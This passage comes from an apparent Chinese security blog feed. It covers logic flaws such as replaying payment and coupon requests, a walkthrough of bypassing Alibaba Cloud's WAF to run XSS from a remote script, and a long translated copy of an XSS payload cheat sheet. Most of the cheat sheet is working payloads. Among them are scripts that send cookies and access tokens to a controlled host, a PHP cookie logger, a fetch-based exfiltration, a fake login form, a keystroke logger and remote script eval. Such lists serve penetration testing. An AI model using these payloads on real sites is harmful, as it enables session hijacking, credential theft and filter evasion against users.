<h3 id="9-条件竞争漏洞"><a href="#9-条件竞争漏洞" class="headerlink" title="9. 条件竞争漏洞"></a>9. 条件竞争漏洞</h3><p>造成这种漏洞的原因一般是，并发数据库锁处理不当或者线程没有加锁，短信轰炸就是这个原理。</p>
<p>抓取商品的付款成功的请求包，重放请求包，如果成功，可以用买一件商品的钱买几十件商品。</p>
<p>优惠券也可以重放请求包。</p>
<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>逻辑漏洞的挖掘其实也是思路拓展的过程</p>
<ol>
<li><p>测试业务的时候，先了解清楚业务整体流程，可以利用思维导图快速理清各个业务之间的关系也可以通过查看 JS 了解（JS 中可能会存在信息泄漏）</p>
</li>
<li><p>重点关注的业务：个人（他人）信息、密码修改（找回）、支付流程、注册流程、需要手机（邮箱）验证的业务</p>
</li>
<li><p>对每个业务模块进行抓包，分析其中各种请求，注意 特殊参数，很有可能就是这些 特殊参数 决定了业务步骤</p>
</li>
<li><p>抓包重放的过程，需要多次实验，判断是否可以跳过（绕过），如何跳过（绕过），纯数字可以用 数字 + 字母 尝试绕过</p>
</li>
<li><p>返回包中数据的分析，关注特殊字符串和特殊参数</p>
</li>
<li><p>综上所述，业务流程需同时结合 HTTP&#x2F;HTTPS 请求分析，关注重点在各种可以用于区别的参数，绕过必要验证，跳过业务步骤。</p>
</li>
</ol>
<h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><p><a href="https://blog.csdn.net/weixin_44578334/article/details/105920859">https://blog.csdn.net/weixin_44578334/article/details/105920859</a></p>
]]></content>
      <categories>
        <category>漏洞总结</category>
      </categories>
      <tags>
        <tag>基础漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>绕过阿里云WAF</title>
    <url>/posts/dd427bdc.html</url>
    <content><![CDATA[<blockquote>
<p>转载自：<a href="https://www.moonsec.com/4225.html">https://www.moonsec.com/4225.html</a></p>
<p>转载理由：</p>
<p>冷知识：https:&#x2F;&#x2F; 绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https:jammny.github.io	==&gt; https://jammny.github.io</span><br></pre></td></tr></table></figure>
</blockquote>
<p>1、我发现目标站点是存在<code>传参回显</code>的，我在参数schoolCode中传入了一个值，接着返回的页面中回显了这个值。</p>
<p><a href="https://www.moonsec.com/wp-content/uploads/2022/04/11650870865.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91WAF/11650870865.png" alt="实战绕过阿里云WAF"></a></p>
<p>2、接着进行<code>数组传参</code>测试，构造了两个schoolCode参数进行传递，页面成功返回了<code>jammny,jammny</code></p>
<p><a href="https://www.moonsec.com/wp-content/uploads/2022/04/01650870866.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91WAF/01650870866.png" alt="实战绕过阿里云WAF"></a></p>
<p>3、通过fuzz，可以看到<script>完整的标签是能够被使用的。</p>
<p><a href="https://www.moonsec.com/wp-content/uploads/2022/04/61650870866.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91WAF/61650870866.png" alt="实战绕过阿里云WAF"></a></p>
<p>4、云waf通常是通过语义检测攻击行为的，因此实际上很多标签都是可以被使用的。比如说<img>标签等：</p>
<p><a href="https://www.moonsec.com/wp-content/uploads/2022/04/11650870867.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91WAF/11650870867.png" alt="实战绕过阿里云WAF"></a></p>
<p>5、本次payload构造选择就使用<script>，先在自己的github.io页面上新建一个xss.js文件，用于src外部引用，内容为：<code>alert(/xss/)</code>。</p>
<p><a href="https://www.moonsec.com/wp-content/uploads/2022/04/31650870868.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91WAF/31650870868.png" alt="实战绕过阿里云WAF"></a></p>
<p>6、正常引用肯定是被拦截的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;https://jammny.github.io/xss.js&quot;&gt;</span><br></pre></td></tr></table></figure>



<p><a href="https://www.moonsec.com/wp-content/uploads/2022/04/61650870868.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91WAF/61650870868.png" alt="实战绕过阿里云WAF"></a></p>
<p>7、不着急，慢慢绕。从右往左的顺序，挨个删直到没有拦截为止。直到如下情况：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">拦截：&lt;script src=https://&gt;</span><br><span class="line">未拦截：&lt;script src=https:/&gt;</span><br></pre></td></tr></table></figure>



<p><a href="https://www.moonsec.com/wp-content/uploads/2022/04/51650870869.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91WAF/51650870869.png" alt="实战绕过阿里云WAF"></a></p>
<p>8、也就是说waf检测到<code>https://</code>就会被拦截。这里科普一个<strong>冷知识</strong>，可以使用``代替<code>//</code>进行绕过，效果是一样的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https:jammny.github.io	==&gt; https://jammny.github.io</span><br></pre></td></tr></table></figure>



<p><a href="https://www.moonsec.com/wp-content/uploads/2022/04/81650870870.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91WAF/81650870870.png" alt="实战绕过阿里云WAF"></a></p>
<p>9、重新开始补全路径，知道加入尖括号闭合后，被waf拦截。</p>
<p><a href="https://www.moonsec.com/wp-content/uploads/2022/04/31650870871.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91WAF/31650870871.png" alt="实战绕过阿里云WAF"></a></p>
<p>10、由于目标可以使用数组传参，因此可以通过构造多一个参数来分割payload。</p>
<script src=https:jammny.github.io/xss.js&schoolCode=>



[![实战绕过阿里云WAF](../imgs/实战之绕过阿里云WAF/11650870871.png)](https://www.moonsec.com/wp-content/uploads/2022/04/11650870871.png)



11、再自己整合一下payload，闭合好标签。就可以成功绕过waf执行xss了。

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script%20src=https:jammny.github.io/xss.js%20&amp;schoolCode=&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>



[![实战绕过阿里云WAF](../imgs/实战之绕过阿里云WAF/51650870872.png)](https://www.moonsec.com/wp-content/uploads/2022/04/51650870872.png)





[![实战绕过阿里云WAF](../imgs/实战之绕过阿里云WAF/11650870873.png)](https://www.moonsec.com/wp-content/uploads/2022/04/11650870873.png)]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>WAF</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS 注入大全</title>
    <url>/posts/a7e4b7be.html</url>
    <content><![CDATA[<blockquote>
<p>  xss payload 大全，学习如何用 xss 做到更多</p>
<p>  转载自：<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection</a></p>
</blockquote>
<h1 id="跨-站点-脚本"><a href="#跨-站点-脚本" class="headerlink" title="跨 站点 脚本"></a>跨 站点 脚本</h1><p>跨站 脚本 （ XSS ） 是 一 种 计算机 安全 漏洞 ， 通常 存在 于 Web 应用 程序 中 。 XSS 使 攻击 者 能够 将 客户 端 脚本 插入 其他 用户 查看 的 网页 中 。</p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>[TOC]</p>
<h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h2 id="漏洞-利用-代码-或-POC"><a href="#漏洞-利用-代码-或-POC" class="headerlink" title="漏洞 利用 代码 或 POC"></a>漏洞 利用 代码 或 POC</h2><h3 id="-2"><a href="#-2" class="headerlink" title=""></a></h3><h3 id="XSS-的-数据-抓取-器"><a href="#XSS-的-数据-抓取-器" class="headerlink" title="XSS 的 数据 抓取 器"></a>XSS 的 数据 抓取 器</h3><p>获取管理员Cookie或敏感访问令牌时，以下负载会将其发送到受控页。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.location=&#x27;http://localhost/XSS/grabber.php?c=&#x27;+document.cookie&lt;/script&gt;</span><br><span class="line">&lt;script&gt;document.location=&#x27;http://localhost/XSS/grabber.php?c=&#x27;+localStorage.getItem(&#x27;access_token&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;new Image().src=&quot;http://localhost/cookie.php?c=&quot;+document.cookie;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;new Image().src=&quot;http://localhost/cookie.php?c=&quot;+localStorage.getItem(&#x27;access_token&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>将收集的数据写入文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cookie = $_GET[&#x27;c&#x27;];</span><br><span class="line">$fp = fopen(&#x27;cookies.txt&#x27;, &#x27;a+&#x27;);</span><br><span class="line">fwrite($fp, &#x27;Cookie:&#x27; .$cookie.&quot;\r\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="-3"><a href="#-3" class="headerlink" title=""></a></h3><h3 id="CORS系统"><a href="#CORS系统" class="headerlink" title="CORS系统"></a>CORS系统</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  fetch(&#x27;https://&lt;SESSION&gt;.burpcollaborator.net&#x27;, &#123;</span><br><span class="line">  method: &#x27;POST&#x27;,</span><br><span class="line">  mode: &#x27;no-cors&#x27;,</span><br><span class="line">  body: document.cookie</span><br><span class="line">  &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="-4"><a href="#-4" class="headerlink" title=""></a></h3><h3 id="UI重定向"><a href="#UI重定向" class="headerlink" title="UI重定向"></a>UI重定向</h3><p>利用XSS修改页面的HTML内容，以显示假的登录表单。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">history.replaceState(null, null, &#x27;../../../login&#x27;);</span><br><span class="line">document.body.innerHTML = &quot;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;h1&gt;Please login to continue&lt;/h1&gt;&lt;form&gt;Username: &lt;input type=&#x27;text&#x27;&gt;Password: &lt;input type=&#x27;password&#x27;&gt;&lt;/form&gt;&lt;input value=&#x27;submit&#x27; type=&#x27;submit&#x27;&gt;&quot;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="-5"><a href="#-5" class="headerlink" title=""></a></h3><h3 id="Javascript键盘记录程序"><a href="#Javascript键盘记录程序" class="headerlink" title="Javascript键盘记录程序"></a>Javascript键盘记录程序</h3><p>另一种收集敏感数据的方法是设置javascript键盘记录程序。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=&#x27;document.onkeypress=function(e)&#123;fetch(&quot;http://domain.com?k=&quot;+String.fromCharCode(e.which))&#125;,this.remove();&#x27;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="-6"><a href="#-6" class="headerlink" title=""></a></h3><h3 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h3><p>更多漏洞，请访问<a href="http://www.xss-payloads.com/payloads-list.html?a#category=all%EF%BC%9A">http://www.xss-payloads.com/payloads-list.html?a#category=all：</a></p>
<ul>
<li><a href="https://www.idontplaydarts.com/2012/04/taking-screenshots-using-xss-and-the-html5-canvas/">使用XSS和HTML5画布进行屏幕截图</a></li>
<li><a href="http://www.gnucitizen.org/blog/javascript-port-scanner/">JavaScript端口扫描程序</a></li>
<li><a href="http://www.xss-payloads.com/payloads/scripts/websocketsnetworkscan.js.html">网络扫描仪</a></li>
<li><a href="http://www.xss-payloads.com/payloads/scripts/dotnetexec.js.html">.NET Shell执行</a></li>
<li><a href="http://www.xss-payloads.com/payloads/scripts/redirectform.js.html">重新导向表单</a></li>
<li><a href="http://www.xss-payloads.com/payloads/scripts/playmusic.js.html">播放音乐</a></li>
</ul>
<h2 id="-7"><a href="#-7" class="headerlink" title=""></a></h2><h2 id="识别XSS端点"><a href="#识别XSS端点" class="headerlink" title="识别XSS端点"></a>识别XSS端点</h2><p>此有效负载在开发人员控制台中打开调试器，而不是触发弹出警告框。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;debugger;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>具有内容托管功能的现代应用程序可以使用<a href="https://security.googleblog.com/2012/08/content-hosting-for-modern-web.html">沙箱域</a></p>
<blockquote>
<p>  安全地托管各种类型的用户生成的内容。许多沙箱专门用于隔离用户上传的HTML、JavaScript或Flash小程序，并确保它们无法访问任何用户数据。</p>
</blockquote>
<p>因此，最好使用<code>alert(document.domain)</code> 或<code>alert(window.origin)</code> 而非<code>alert(1)</code> 作为默认的XSS有效负载，以便了解XSS实际执行的作用域。</p>
<p>更好的有效负载更换<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(document.domain.concat(&quot;\n&quot;).concat(window.origin))&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>当<code>alert()</code> 对于反射的XSS是很好的，但对于存储的XSS来说，它很快就会成为一个负担，因为它要求在每次执行时关闭弹出窗口，所以<code>console.log()</code> 可用于在开发人员控制台的控制台中显示消息（不需要任何交互）。</p>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;console.log(&quot;Test XSS from the search bar of page XYZ\n&quot;.concat(document.domain).concat(&quot;\n&quot;).concat(window.origin))&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>参考文献：</p>
<ul>
<li><a href="https://sites.google.com/site/bughunteruniversity/nonvuln/xss-in-sandbox-domain">Google Bughunter大学-沙盒域中的XSS</a></li>
<li><a href="https://www.youtube.com/watch?v=KHwVjzWei1c">LiveOverflow视频-请勿将警报（1）用于XSS</a></li>
<li><a href="https://liveoverflow.com/do-not-use-alert-1-in-xss/">LiveOverflow博客文章-请勿使用XSS的警示（1）</a></li>
</ul>
<h3 id="-8"><a href="#-8" class="headerlink" title=""></a></h3><h3 id="工具Name"><a href="#工具Name" class="headerlink" title="工具Name"></a>工具Name</h3><p>大多数工具也适用于盲目的XSS攻击：</p>
<ul>
<li><a href="https://github.com/s0md3v/XSStrike">XSS攻击</a>：非常受欢迎，但遗憾的是维护得不太好</li>
<li><a href="https://github.com/epsylon/xsser">x系列</a>：利用无头浏览器检测XSS漏洞</li>
<li><a href="https://github.com/hahwul/dalfox">达尔福克斯</a>：在Go语言中实现的广泛功能和极快的速度</li>
<li><a href="https://github.com/hahwul/XSpear">X矛</a>：与Dalfox类似，但基于Ruby</li>
<li><a href="https://github.com/fcavallarin/domdig">多姆迪格</a>：无头Chrome XSS测试仪</li>
</ul>
<h2 id="-9"><a href="#-9" class="headerlink" title=""></a></h2><h2 id="HTML中的XSS-x2F-应用程序"><a href="#HTML中的XSS-x2F-应用程序" class="headerlink" title="HTML中的XSS&#x2F;应用程序"></a>HTML中的XSS&#x2F;应用程序</h2><h3 id="-10"><a href="#-10" class="headerlink" title=""></a></h3><h3 id="通用有效负载"><a href="#通用有效负载" class="headerlink" title="通用有效负载"></a>通用有效负载</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Basic payload</span><br><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(&#x27;XSS&#x27;)&lt;/scr&lt;script&gt;ipt&gt;</span><br><span class="line">&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line">&quot;&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;</span><br><span class="line">&lt;script&gt;\u0061lert(&#x27;22&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;eval(&#x27;\x61lert(\&#x27;33\&#x27;)&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;eval(8680439..toString(30))(983801..toString(36))&lt;/script&gt; //parseInt(&quot;confirm&quot;,30) == 8680439 &amp;&amp; 8680439..toString(30) == &quot;confirm&quot;</span><br><span class="line">&lt;object/data=&quot;jav&amp;#x61;sc&amp;#x72;ipt&amp;#x3a;al&amp;#x65;rt&amp;#x28;23&amp;#x29;&quot;&gt;</span><br><span class="line"></span><br><span class="line">// Img payload</span><br><span class="line">&lt;img src=x onerror=alert(&#x27;XSS&#x27;);&gt;</span><br><span class="line">&lt;img src=x onerror=alert(&#x27;XSS&#x27;)//</span><br><span class="line">&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&gt;</span><br><span class="line">&lt;img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));&gt;</span><br><span class="line">&lt;img src=x:alert(alt) onerror=eval(src) alt=xss&gt;</span><br><span class="line">&quot;&gt;&lt;img src=x onerror=alert(&#x27;XSS&#x27;);&gt;</span><br><span class="line">&quot;&gt;&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&gt;</span><br><span class="line"></span><br><span class="line">// Svg payload</span><br><span class="line">&lt;svgonload=alert(1)&gt;</span><br><span class="line">&lt;svg/onload=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&lt;svg onload=alert(1)//</span><br><span class="line">&lt;svg/onload=alert(String.fromCharCode(88,83,83))&gt;</span><br><span class="line">&lt;svg id=alert(1) onload=eval(id)&gt;</span><br><span class="line">&quot;&gt;&lt;svg/onload=alert(String.fromCharCode(88,83,83))&gt;</span><br><span class="line">&quot;&gt;&lt;svg/onload=alert(/XSS/)</span><br><span class="line">&lt;svg&gt;&lt;script href=data:,alert(1) /&gt;(`Firefox` is the only browser which allows self closing script)</span><br><span class="line">&lt;svg&gt;&lt;script&gt;alert(&#x27;33&#x27;)</span><br><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;lpar;&#x27;33&#x27;&amp;rpar;</span><br><span class="line"></span><br><span class="line">// Div payload</span><br><span class="line">&lt;div onpointerover=&quot;alert(45)&quot;&gt;MOVE HERE&lt;/div&gt;</span><br><span class="line">&lt;div onpointerdown=&quot;alert(45)&quot;&gt;MOVE HERE&lt;/div&gt;</span><br><span class="line">&lt;div onpointerenter=&quot;alert(45)&quot;&gt;MOVE HERE&lt;/div&gt;</span><br><span class="line">&lt;div onpointerleave=&quot;alert(45)&quot;&gt;MOVE HERE&lt;/div&gt;</span><br><span class="line">&lt;div onpointermove=&quot;alert(45)&quot;&gt;MOVE HERE&lt;/div&gt;</span><br><span class="line">&lt;div onpointerout=&quot;alert(45)&quot;&gt;MOVE HERE&lt;/div&gt;</span><br><span class="line">&lt;div onpointerup=&quot;alert(45)&quot;&gt;MOVE HERE&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<h3 id="-11"><a href="#-11" class="headerlink" title=""></a></h3><h3 id="使用HTML5标签的XSS"><a href="#使用HTML5标签的XSS" class="headerlink" title="使用HTML5标签的XSS"></a>使用HTML5标签的XSS</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body onload=alert(/XSS/.source)&gt;</span><br><span class="line">&lt;input autofocus onfocus=alert(1)&gt;</span><br><span class="line">&lt;select autofocus onfocus=alert(1)&gt;</span><br><span class="line">&lt;textarea autofocus onfocus=alert(1)&gt;</span><br><span class="line">&lt;keygen autofocus onfocus=alert(1)&gt;</span><br><span class="line">&lt;video/poster/onerror=alert(1)&gt;</span><br><span class="line">&lt;video&gt;&lt;source onerror=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;video src=_ onloadstart=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;details/open/ontoggle=&quot;alert`1`&quot;&gt;</span><br><span class="line">&lt;audio src onloadstart=alert(1)&gt;</span><br><span class="line">&lt;marquee onstart=alert(1)&gt;</span><br><span class="line">&lt;meter value=2 min=0 max=10 onmouseover=alert(1)&gt;2 out of 10&lt;/meter&gt;</span><br><span class="line"></span><br><span class="line">&lt;body ontouchstart=alert(1)&gt; // Triggers when a finger touch the screen</span><br><span class="line">&lt;body ontouchend=alert(1)&gt;   // Triggers when a finger is removed from touch screen</span><br><span class="line">&lt;body ontouchmove=alert(1)&gt;  // When a finger is dragged across the screen.</span><br></pre></td></tr></table></figure>

<h3 id="-12"><a href="#-12" class="headerlink" title=""></a></h3><h3 id="使用远程JS的XSS"><a href="#使用远程JS的XSS" class="headerlink" title="使用远程JS的XSS"></a>使用远程JS的XSS</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg/onload=&#x27;fetch(&quot;//host/a&quot;).then(r=&gt;r.text().then(t=&gt;eval(t)))&#x27;&gt;</span><br><span class="line">&lt;script src=14.rs&gt;</span><br><span class="line">// you can also specify an arbitrary payload with 14.rs/#payload</span><br><span class="line">e.g: 14.rs/#alert(document.domain)</span><br></pre></td></tr></table></figure>

<h3 id="-13"><a href="#-13" class="headerlink" title=""></a></h3><h3 id="隐藏输入中的XSS"><a href="#隐藏输入中的XSS" class="headerlink" title="隐藏输入中的XSS"></a>隐藏输入中的XSS</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;hidden&quot; accesskey=&quot;X&quot; onclick=&quot;alert(1)&quot;&gt;</span><br><span class="line">Use CTRL+SHIFT+X to trigger the onclick event</span><br></pre></td></tr></table></figure>

<h3 id="-14"><a href="#-14" class="headerlink" title=""></a></h3><h3 id="当有效负载以大写字母表示时，XSS"><a href="#当有效负载以大写字母表示时，XSS" class="headerlink" title="当有效负载以大写字母表示时，XSS"></a>当有效负载以大写字母表示时，XSS</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;IMG SRC=1 ONERROR=&amp;#X61;&amp;#X6C;&amp;#X65;&amp;#X72;&amp;#X74;(1)&gt;</span><br></pre></td></tr></table></figure>

<h3 id="-15"><a href="#-15" class="headerlink" title=""></a></h3><h3 id="基于DOM的XSS"><a href="#基于DOM的XSS" class="headerlink" title="基于DOM的XSS"></a>基于DOM的XSS</h3><p>基于 DOM XSS 接收 器 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#&quot;&gt;&lt;img src=/ onerror=alert(2)&gt;</span><br></pre></td></tr></table></figure>

<h3 id="-16"><a href="#-16" class="headerlink" title=""></a></h3><h3 id="JS-上下-文-中-的-XSS"><a href="#JS-上下-文-中-的-XSS" class="headerlink" title="JS 上下 文 中 的 XSS"></a>JS 上下 文 中 的 XSS</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-(confirm)(document.domain)//</span><br><span class="line">; alert(1);//</span><br><span class="line">// (payload without quote/double quote from [@brutelogic](https://twitter.com/brutelogic)</span><br></pre></td></tr></table></figure>

<h2 id="-17"><a href="#-17" class="headerlink" title=""></a></h2><h2 id="包装-器-javascript-和-数据-URI-中-的-XSS"><a href="#包装-器-javascript-和-数据-URI-中-的-XSS" class="headerlink" title="包装 器 javascript 和 数据 URI 中 的 XSS"></a>包装 器 javascript 和 数据 URI 中 的 XSS</h2><p>带有 JavaScript 的 XSS ：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:prompt(1)</span><br><span class="line"></span><br><span class="line">%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341</span><br><span class="line"></span><br><span class="line">&amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#99&amp;#111&amp;#110&amp;#102&amp;#105&amp;#114&amp;#109&amp;#40&amp;#49&amp;#41</span><br><span class="line"></span><br><span class="line">We can encode the &quot;javascript:&quot; in Hex/Octal</span><br><span class="line">\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)</span><br><span class="line">\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)</span><br><span class="line">\152\141\166\141\163\143\162\151\160\164\072alert(1)</span><br><span class="line"></span><br><span class="line">We can use a &#x27;newline character&#x27;</span><br><span class="line">java%0ascript:alert(1)   - LF (\n)</span><br><span class="line">java%09script:alert(1)   - Horizontal tab (\t)</span><br><span class="line">java%0dscript:alert(1)   - CR (\r)</span><br><span class="line"></span><br><span class="line">Using the escape character</span><br><span class="line">\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)</span><br><span class="line"></span><br><span class="line">Using the newline and a comment //</span><br><span class="line">javascript://%0Aalert(1)</span><br><span class="line">javascript://anything%0D%0A%0D%0Awindow.alert(1)</span><br></pre></td></tr></table></figure>

<p>带 数据 的 XSS ：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data:text/html,&lt;script&gt;alert(0)&lt;/script&gt;</span><br><span class="line">data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+</span><br><span class="line">&lt;script src=&quot;data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>带有vbscript的XSS：仅IE</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vbscript:msgbox(&quot;XSS&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="-18"><a href="#-18" class="headerlink" title=""></a></h2><h2 id="文件中的XSS"><a href="#文件中的XSS" class="headerlink" title="文件中的XSS"></a>文件中的XSS</h2><p>** 注意：** 此处使用XML CDATA部分是为了使JavaScript有效负载不会被视为XML标记.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;name&gt;</span><br><span class="line">  &lt;value&gt;&lt;![CDATA[&lt;script&gt;confirm(document.domain)&lt;/script&gt;]]&gt;&lt;/value&gt;</span><br><span class="line">&lt;/name&gt;</span><br></pre></td></tr></table></figure>

<h3 id="-19"><a href="#-19" class="headerlink" title=""></a></h3><h3 id="XML中的XSS"><a href="#XML中的XSS" class="headerlink" title="XML中的XSS"></a>XML中的XSS</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;something:script xmlns:something=&quot;http://www.w3.org/1999/xhtml&quot;&gt;alert(1)&lt;/something:script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

